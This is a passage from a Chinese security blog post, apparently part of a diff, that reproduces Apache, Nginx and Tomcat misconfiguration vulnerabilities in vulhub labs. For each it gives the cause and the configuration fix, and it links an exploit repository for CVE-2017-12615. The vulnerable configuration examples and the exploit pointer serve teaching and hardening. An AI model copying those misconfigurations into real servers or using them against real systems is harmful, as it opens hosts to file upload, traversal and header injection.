+<h3 id="修复方式-2"><a href="#修复方式-2" class="headerlink" title="修复方式"></a>修复方式</h3><p>获取文件名时用<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>,它会将换行符号自动去除。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_FILES</span>[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="comment">#$name = basename($_POST['name']);</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">'./'</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/003_4.png" alt="003_4"></p>
+<p>可以看到上传失败了。</p>
+<ol>
+<li>上传文件功能配合白名单为过滤条件 </li>
+<li>上传文件目录限制脚本执行权限</li>
+</ol>
+<h2 id="Apache-HTTPD-未知后缀解析漏洞"><a href="#Apache-HTTPD-未知后缀解析漏洞" class="headerlink" title="Apache HTTPD 未知后缀解析漏洞"></a>Apache HTTPD 未知后缀解析漏洞</h2><p>环境采用vulhub的<code>/httpd/apache_parsing_vulnerability</code></p>
+<h3 id="漏洞原理-5"><a href="#漏洞原理-5" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache默认一个文件可以有多个点分隔的后缀,如果最右的后缀无法解析会向左推进。加上运维人员错误配置如下</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler <span class="built_in">application</span>/x-httpd-php .php</span><br></pre></td></tr></table></figure>
+
+<p>可以发现上面的配置没有正则匹配的，所以在任意位置匹配到<code>.php</code>，会拿去给<code>php_module</code>解析。</p>
+<h3 id="实践过程-1"><a href="#实践过程-1" class="headerlink" title="实践过程"></a>实践过程</h3><p><img src="/img/knowledge/Middleware_Parsing_vulnerability/004_1.png" alt="004_1"></p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/004_2.png" alt="004_2"></p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/004_3.png" alt="004_3"></p>
+<h3 id="修复方式-3"><a href="#修复方式-3" class="headerlink" title="修复方式"></a>修复方式</h3><p>修改AddHandler方法为SetHandler方法</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#AddHandler application/x-httpd-php .php</span></span><br><span class="line"><span class="section">&lt;FilesMatch ".+\.php$"&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/004_4.png" alt="004_4"></p>
+<p>禁止<code>.php.</code>格式执行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch ".+\. ph(p[3457]?|t|tml)\."&gt;</span></span><br><span class="line"><span class="attribute">Require</span> <span class="literal">all</span> denied</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Nginx相关"><a href="#Nginx相关" class="headerlink" title="Nginx相关"></a>Nginx相关</h1><h2 id="Nginx-lt-8-03畸形解析漏洞"><a href="#Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="Nginx &lt;8.03畸形解析漏洞"></a>Nginx &lt;8.03畸形解析漏洞</h2><h3 id="漏洞原理-6"><a href="#漏洞原理-6" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>测试环境采用的是<code>vulhub</code>的<code>nginx/nginx_parsing_vulnerability</code>,说是Nginx的锅,实际还是和上面的一样,还是<code>cgi.fix_pathinfo=1</code>,当访问<code>ngnix.png/.php</code>时,<code>ngnix.png/.php</code>存在而进行修剪,最终将<code>ngnix.png</code>当php解析。</p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/002_7.png" alt="002_7"></p>
+<h4 id="Nginx修复方式-1"><a href="#Nginx修复方式-1" class="headerlink" title="Nginx修复方式"></a>Nginx修复方式</h4><ol>
+<li><p>修改php.ini文件，将cgi.fix_pathinfo的值设置为0</p>
+</li>
+<li><p>正则表达式过滤非法输入,代码如下</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置nginx.conf</span></span><br><span class="line"><span class="attribute">if</span> ( <span class="variable">$fastcgi_script_name</span> <span class="regexp">~ \..*\/.*php</span> ) &#123;</span><br><span class="line">　　<span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在Nginx端使用<code>fastcgi_split_path_info</code>将path info信息去除后，用tryfiles判断文件是否存在；并设置PHP-FPM的<code>security.limit_extensions</code>为<code>.php</code>，避免其他后缀文件被解析。</p>
+</li>
+</ol>
+<h2 id="Nginx-配置错误导致漏洞"><a href="#Nginx-配置错误导致漏洞" class="headerlink" title="Nginx 配置错误导致漏洞"></a>Nginx 配置错误导致漏洞</h2><h3 id="目录穿越漏洞"><a href="#目录穿越漏洞" class="headerlink" title="目录穿越漏洞"></a>目录穿越漏洞</h3><h4 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>错误的配置导致目录遍历和信息泄露</p>
+<p><code>autoindex on</code>开启了目录遍历。Nginx在配置别名（Alias）的时候，如果忘记加<code>/</code>，将造成一个目录穿越漏洞。</p>
+<p>错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：</p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/006_2.png" alt="006_2"></p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/006_1.png" alt="006_1"></p>
+<h4 id="修复方式-4"><a href="#修复方式-4" class="headerlink" title="修复方式"></a>修复方式</h4><p>将<code>autoindex on;</code>改成<code>autoindex off</code>。</p>
+<p><code>/files</code>补全为<code>/files/</code></p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/006_3.png" alt="006_3"></p>
+<h3 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h3><p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
+<p>Nginx会将<code>$uri</code>进行解码，导致传入%0a%0d即可引入换行符，而造成CRLF注入漏洞。</p>
+<p>查看Nginx文档，可以发现有三个表示uri的变量：</p>
+<ol>
+<li><code>$uri</code></li>
+<li><code>$document_uri</code></li>
+<li><code>$request_uri</code></li>
+</ol>
+<p>1和2表示的是解码以后的请求路径，不带参数；3表示的是完整的URI（没有解码）。</p>
+<p>错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">	<span class="attribute">listen</span> <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">	<span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line">	<span class="attribute">index</span> index.html;</span><br><span class="line"></span><br><span class="line">	<span class="attribute">server_name</span> _;</span><br><span class="line"></span><br><span class="line">	<span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">302</span> https://<span class="variable">$host</span><span class="variable">$uri</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><h5 id="会话固定"><a href="#会话固定" class="headerlink" title="会话固定"></a>会话固定</h5><p><img src="/img/knowledge/Middleware_Parsing_vulnerability/006_4.png" alt="006_4"></p>
+<h5 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h5><h5 id="设置Cookie引发的CSRF漏洞"><a href="#设置Cookie引发的CSRF漏洞" class="headerlink" title="设置Cookie引发的CSRF漏洞"></a>设置Cookie引发的CSRF漏洞</h5><h4 id="修复方式-5"><a href="#修复方式-5" class="headerlink" title="修复方式"></a>修复方式</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">302</span> https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Tomcat相关"><a href="#Tomcat相关" class="headerlink" title="Tomcat相关"></a>Tomcat相关</h1><h2 id="PUT方法任意写文件漏洞-CVE-2017-12615"><a href="#PUT方法任意写文件漏洞-CVE-2017-12615" class="headerlink" title="PUT方法任意写文件漏洞 (CVE-2017-12615)"></a>PUT方法任意写文件漏洞 (CVE-2017-12615)</h2><h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>在Tomcat安装目录下的配置文件web.xml中的org.apache.catalina.servlets.DefaultServlet方法下如果该方法有如下代码，即表示Tomcat已开启PUT方法</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-<span class="built_in">param</span>&gt; </span><br><span class="line">      &lt;<span class="built_in">param</span>-name&gt;readonly&lt;/<span class="built_in">param</span>-name&gt; </span><br><span class="line">      &lt;<span class="built_in">param</span>-<span class="built_in">value</span>&gt;<span class="literal">false</span>&lt;/<span class="built_in">param</span>-<span class="built_in">value</span>&gt; </span><br><span class="line">&lt;/init-<span class="built_in">param</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/007_1.png" alt="007_1"></p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/007_2.png" alt="007_2"></p>
+<h3 id="利用exp"><a href="#利用exp" class="headerlink" title="利用exp"></a>利用exp</h3><p><code>https://github.com/iBearcat/CVE-2017-12615</code></p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/007_3.png" alt="007_3"></p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/007_4.png" alt="007_4"></p>
+<h3 id="修复方式-6"><a href="#修复方式-6" class="headerlink" title="修复方式"></a>修复方式</h3><p>在Tomcat的web.xml 文件中配置org.apache.catalina.servlets.DefaultServlet的初始化参数</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-<span class="built_in">param</span>&gt;</span><br><span class="line">      &lt;<span class="built_in">param</span>-name&gt;readonly&lt;/<span class="built_in">param</span>-name&gt;</span><br><span class="line">      &lt;<span class="built_in">param</span>-<span class="built_in">value</span>&gt;<span class="literal">true</span>&lt;/<span class="built_in">param</span>-<span class="built_in">value</span>&gt;</span><br><span class="line">&lt;/init-<span class="built_in">param</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>确保readonly参数为true（默认值），即不允许DELETE和PUT操作。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-heart"></i>感谢阅读-------------</div>
+    
+</div>
+  
+</div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/知识点/" rel="tag"># 知识点</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/26/2008R2域环境搭建/" rel="prev" title="2008R2域环境搭建">
+                <i class="fa fa-chevron-left"></i> 2008R2域环境搭建
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/21/sqli-labs-lession-54-GET-Union-变化1-仅允许10次请求/" rel="next" title="sqli-labs lession-54 GET-Union-变化1-仅允许10次请求">
+                sqli-labs lession-54 GET-Union-变化1-仅允许10次请求 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <a href="/">
+                <img class="site-author-image" itemprop="image" src="/images/jack.jpg" alt="嘤嘤怪er">
+              </a>
+            
+              <p class="site-author-name" itemprop="name">嘤嘤怪er</p>
+              <p class="site-description motion-element" itemprop="description">0menc</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">101</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#中间件及其相关漏洞复现"><span class="nav-number">1.</span> <span class="nav-text">中间件及其相关漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IIS相关"><span class="nav-number">2.</span> <span class="nav-text">IIS相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS-5-x-6-x-解析漏洞"><span class="nav-number">2.1.</span> <span class="nav-text">IIS 5.x-6.x 解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理"><span class="nav-number">2.1.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目录解析"><span class="nav-number">2.1.2.</span> <span class="nav-text">目录解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件解析"><span class="nav-number">2.1.3.</span> <span class="nav-text">文件解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复方式"><span class="nav-number">2.1.4.</span> <span class="nav-text">修复方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞解析漏洞"><span class="nav-number">2.2.</span> <span class="nav-text">IIS 7.0/IIS 7.5/Nginx &lt;8.03畸形解析漏洞解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS-7-5"><span class="nav-number">2.2.2.</span> <span class="nav-text">IIS 7.5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS-7-0"><span class="nav-number">2.2.3.</span> <span class="nav-text">IIS 7.0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS-7-0-7-5-修复方式"><span class="nav-number">2.2.4.</span> <span class="nav-text">IIS 7.0/7.5 修复方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nginx"><span class="nav-number">2.2.5.</span> <span class="nav-text">Nginx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理-2"><span class="nav-number">2.2.6.</span> <span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Nginx修复方式"><span class="nav-number">2.2.6.1.</span> <span class="nav-text">Nginx修复方式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS6-0远程命令执行漏洞-CVE-2017-7269"><span class="nav-number">2.3.</span> <span class="nav-text">IIS6.0远程命令执行漏洞(CVE-2017-7269)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理-3"><span class="nav-number">2.3.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#环境"><span class="nav-number">2.3.2.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#探测脚本"><span class="nav-number">2.3.3.</span> <span class="nav-text">探测脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">2.3.4.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复方式-1"><span class="nav-number">2.3.5.</span> <span class="nav-text">修复方式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Apache相关"><span class="nav-number">3.</span> <span class="nav-text">Apache相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><span class="nav-number">3.1.</span> <span class="nav-text">Apache HTTPD 换行解析漏洞（CVE-2017-15715）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理-4"><span class="nav-number">3.1.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实践过程"><span class="nav-number">3.1.2.</span> <span class="nav-text">实践过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复方式-2"><span class="nav-number">3.1.3.</span> <span class="nav-text">修复方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-HTTPD-未知后缀解析漏洞"><span class="nav-number">3.2.</span> <span class="nav-text">Apache HTTPD 未知后缀解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理-5"><span class="nav-number">3.2.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实践过程-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">实践过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复方式-3"><span class="nav-number">3.2.3.</span> <span class="nav-text">修复方式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Nginx相关"><span class="nav-number">4.</span> <span class="nav-text">Nginx相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Nginx-lt-8-03畸形解析漏洞"><span class="nav-number">4.1.</span> <span class="nav-text">Nginx &lt;8.03畸形解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理-6"><span class="nav-number">4.1.1.</span> <span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Nginx修复方式-1"><span class="nav-number">4.1.1.1.</span> <span class="nav-text">Nginx修复方式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nginx-配置错误导致漏洞"><span class="nav-number">4.2.</span> <span class="nav-text">Nginx 配置错误导致漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#目录穿越漏洞"><span class="nav-number">4.2.1.</span> <span class="nav-text">目录穿越漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原因"><span class="nav-number">4.2.1.1.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#修复方式-4"><span class="nav-number">4.2.1.2.</span> <span class="nav-text">修复方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CRLF注入漏洞"><span class="nav-number">4.2.2.</span> <span class="nav-text">CRLF注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用方式"><span class="nav-number">4.2.2.1.</span> <span class="nav-text">利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#会话固定"><span class="nav-number">4.2.2.1.1.</span> <span class="nav-text">会话固定</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#xss漏洞"><span class="nav-number">4.2.2.1.2.</span> <span class="nav-text">xss漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#设置Cookie引发的CSRF漏洞"><span class="nav-number">4.2.2.1.3.</span> <span class="nav-text">设置Cookie引发的CSRF漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#修复方式-5"><span class="nav-number">4.2.2.2.</span> <span class="nav-text">修复方式</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tomcat相关"><span class="nav-number">5.</span> <span class="nav-text">Tomcat相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PUT方法任意写文件漏洞-CVE-2017-12615"><span class="nav-number">5.1.</span> <span class="nav-text">PUT方法任意写文件漏洞 (CVE-2017-12615)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞条件"><span class="nav-number">5.1.1.</span> <span class="nav-text">漏洞条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用exp"><span class="nav-number">5.1.2.</span> <span class="nav-text">利用exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复方式-6"><span class="nav-number">5.1.3.</span> <span class="nav-text">修复方式</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">嘤嘤怪er</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+<script type="text/javascript">
+
+    var a_idx = 0;
+    jQuery(document).ready(function($) {
+        $("body").click(function(e) {
+            var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");
+            var $i = $("<span />").text(a[a_idx]);
+            a_idx = (a_idx + 1) % a.length;
+            var x = e.pageX,
+                y = e.pageY;
+            $i.css({
+                "z-index": 99999999999999999999999999999999999999999999999999999999999999999999999999 ,
+                "top": y - 20,
+                "left": x,
+                "position": "absolute",
+                "font-weight": "bold",
+                "color": "#ff6651"
+            });
+            $("body").append($i);
+            $i.animate({
+                    "top": y - 180,
+                    "opacity": 0
+                },
+                1500,
+                function() {
+                    $i.remove();
+                });
+        });
+    });
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300,"bottom":-40},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
